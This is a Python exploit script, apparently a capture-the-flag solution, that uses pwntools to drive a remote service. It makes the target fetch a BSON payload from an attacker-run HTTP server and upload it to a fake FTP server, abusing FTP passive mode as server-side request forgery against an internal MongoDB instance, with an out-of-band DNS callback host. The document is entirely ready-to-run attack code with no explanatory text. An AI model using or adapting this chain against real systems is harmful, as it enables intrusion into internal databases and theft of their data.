from pwn import remote, sleep, info
import threading
from urllib.parse import urljoin
import fakeftp
import httpserver
import random
from subprocess import Popen
import re

LHOST = "172.17.0.1"
DNSHOOK = "ck1ghv72vtc00002x710gjoae7oyyyyyb.oast.fun"
RHOST = "localhost"
RPORT = 80

httpport = random.randint(10000, 65535)
ftpport = random.randint(10000, 65535)
fileserver = f"http://{LHOST}:{httpport}/"
ftpserver = f"ftp://{LHOST}:{ftpport}/"


# generate BSON payload for ssrf to mongodb
bsonfile = "payload.bson"
Popen(['node', 'gen_bson', bsonfile, DNSHOOK])

threading.Thread(
    target=httpserver.serve,
    args=(httpport,),
    daemon=True
).start()
sleep(3)

p = remote(RHOST, RPORT)

p.recv(10000)

# Get information about db ip throught dns request
p.sendline(b"curl http://db -vvv")

dbhost = p.recvline_contains(b"port 80 failed: Connection refused").decode()
dbhost = re.findall(r"(?<=connect to ).*?(?= port 80 failed)", dbhost)[0]
info("dbhost: %s", dbhost)
threading.Thread(
    target=fakeftp.handle_ftp,
    args=(ftpport, dbhost, 27017),
    daemon=True
).start()
sleep(3)

# send payload with http request
p.sendline(f"curl {urljoin(fileserver, bsonfile)} -o {bsonfile}".encode())

# trigger ftp pasv request ssrf
cmd = f"curl {ftpserver} --upload-file {bsonfile} --verbose --no-ftp-skip-pasv-ip --disable-epsv --no-buffer".encode()
info("payload: %s", cmd)
p.sendline(cmd)
while p.can_recv():
    resp = p.recv(10000).decode().replace("\r", "")
    print(resp)
sleep(3)
